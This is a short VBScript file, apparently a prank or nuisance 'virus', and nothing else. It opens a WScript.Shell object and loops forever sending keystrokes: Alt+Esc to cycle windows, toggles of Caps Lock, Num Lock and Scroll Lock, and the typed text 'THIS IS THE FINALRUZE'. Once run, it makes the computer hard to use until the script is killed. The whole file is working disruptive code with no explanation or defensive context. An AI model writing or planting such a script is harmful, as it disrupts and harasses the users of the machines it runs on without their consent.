Set x = CreateObject("WScript.Shell")
Do
    'Plays the first beeping sound
    x.SendKeys "%{ESC}"
    WScript.Sleep 500
    x.SendKeys "%{ESC}"
    WScript.Sleep 100
    x.SendKeys "{CAPSLOCK}"
    x.SendKeys "{NUMLOCK}"
    x.SendKeys "THIS IS THE FINALRUZE "
    x.SendKeys "{SCROLLLOCK}"
    'Plays the second beeping sound
    x.SendKeys "%{ESC}"
    WScript.Sleep 300
    x.SendKeys "%{ESC}"
    WScript.Sleep 100
Loop
